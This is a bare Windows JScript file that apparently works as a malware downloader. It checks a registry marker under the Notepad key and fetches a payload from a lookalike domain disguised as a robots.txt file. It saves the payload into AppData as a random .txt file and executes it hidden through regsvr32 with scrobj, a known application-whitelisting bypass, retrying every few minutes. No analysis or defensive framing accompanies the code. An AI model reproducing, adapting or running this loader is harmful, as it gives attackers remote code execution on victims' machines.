function obj(xString) {return new ActiveXObject(xString);}

var xhr;try {xhr = obj("Msxml2.ServerXMLHTTP.6.0");} catch (e) {xhr = obj("Msxml2.ServerXMLHTTP.3.0");}
var con;try {con = obj("Msxml2.XMLHTTP.6.0");} catch (e) {try {con = obj("Msxml2.XMLHTTP.3.0");} catch (e) {con = obj("Microsoft.XMLHTTP");}}

function check_Net() {
    var Resp = false;
    var conz1 = con;
    try {
        conz1.open("HEAD", "http://www.w3.org/1999/XSL/Format", false);
    } catch (e1) {
        return false;
    }
    conz1.onreadystatechange = function() {
        if (conz1.readyState === 4) {
            if (conz1.status === 200) {Resp = true;}
        }
    };
    try {
        conz1.send();
    } catch (e2) {
        return false;
    }
    return Resp;
}

function fuck_js() {
    try {
        xhr.setTimeouts(5000, 5000, 10000, 10000);
        xhr.open("GET", "http://8.8.8.8/" + (Math.random() * 100000).toFixed(0), false);
        xhr.send();
    } catch (e) {
        return false;
    }
}

function waitfor(zMinute, iGo) {
    var xlmt;
    xlmt = Date.parse(Date()) + (zMinute * 60000);
    while (Date.parse(Date()) < xlmt) {
        fuck_js();
    }
    if (iGo === 1) {
        go();
    }
}

function pnow(URL, SaveTo) {
    var con3 = con;
    try {
        con3.open("GET", URL, false);
    } catch (e14) {
        return false;
    }
    con3.onreadystatechange = function() {
        if (con3.readyState === 4) {
            if (con3.status === 200) {
                try {
                    var adb = obj("ADODB.Stream");
                    adb.open();
                    adb.type = 1;
                    adb.write(con3.responsebody);
                    adb.savetofile(SaveTo);
                    adb.close();
                } catch (e551) {
                    return false;
                }
            } else {
                return false;
            }
        } else {
            return false;
        }
    };
    try {
        con3.send();
    } catch (e15) {
        return false;
    }
    return true;
}

function myEnv(xVar) {var a1;var rEnv;a1 = obj("WScript.Shell");rEnv = a1.environment("PROCESS");return rEnv(xVar);}

function xGo(xcmd) {
    try {
        var wsh = obj("wscript.shell");
        wsh.run(xcmd, 0, 0);
        return true;
    } catch (e) {
        return false;
    }
}

function uN() {try {var WN = obj("WScript.Network");return WN.UserName;} catch (e7) {return "un_error";}}

function fexist(xpath) {var fso;try {fso = obj("Scripting.FileSystemObject");if (fso.FileExists(xpath)) {return true;} else {return false;}} catch (feer) {return false;}}

function tExtra() {return Math.floor(Math.random() * 65536) + ".txt";}

var xStore = "";
xStore = "HKEY_CURRENT_USER\\Software\\Microsoft\\Notepad\\" + uN();

function hit() {
    var x1;
    var Note;
    var Sp;
    var saveTo = "";var comm = "";
    var mLink = "https://api.toshiba.org.kz/robots.txt";
	var xx1 = "regsvr32 /S /N /U /I:";
        saveTo = myEnv("APPDATA") + "\\";
        try {
            x1 = obj("WScript.Shell");
            Note = x1.RegRead(xStore);
            if (Note) {
                if (Note.indexOf(",") !== -1) {
                    Sp = Note.split(",");
                    saveTo += Sp[0] + ".txt";
                } else {
                    saveTo += tExtra();
                }
            } else {
                saveTo += tExtra();
            }
        } catch (e11) {
            saveTo += tExtra();
        }
        var dq = "\x22";
        comm = xx1 + dq + saveTo + dq + " sCrobJ"
        if (fexist(saveTo) === false) {
            if (pnow(mLink, saveTo) === true) {
                if (xGo(comm) === true) {
                    return true;
                }
            }
        } else {
            if (xGo(comm) === true) {
                return true;
            }
        }
}

function go() {if (check_Net() === true) {if (hit() !== true) {waitfor(3, 1);}} else {waitfor(3, 1);}}

function cIn(){
var x1;var Note;var Sp;var uLoc = "";

try{
x1 = obj("WScript.Shell");
Note = x1.RegRead(xStore);

if (Note) {

if (Note.indexOf(",") !== -1) {

Sp = Note.split(",");

if (Sp.length === 2)
{
uLoc = myEnv("APPDATA") + "\\" + Sp[1] + ".txt";

if (fexist(uLoc) === false){return false;}

return true;
} else {return false;}

} else {return false;}
} else {return false;}

} catch(e89){return false;}

}

if (cIn() === true){go();}
